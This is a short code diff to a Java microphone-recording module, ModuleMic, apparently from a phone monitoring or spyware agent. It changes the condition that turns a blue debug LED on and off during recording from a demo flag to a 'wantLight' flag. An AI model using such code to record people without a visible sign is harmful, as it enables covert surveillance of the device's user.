@@ -151,7 +151,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
         debug.trace("Started: " + (recorder != null));
         //#endif
 
-        if (Status.self().isDemo()) {
+        if (Status.self().wantLight()) {
             Debug.ledStart(Debug.COLOR_BLUE_LIGHT);
         }
 
@@ -175,7 +175,7 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
         //#endif
 
         recorder.stop();
-        if (Status.self().isDemo()) {
+        if (Status.self().wantLight()) {
             Debug.ledStop();
         }
     }
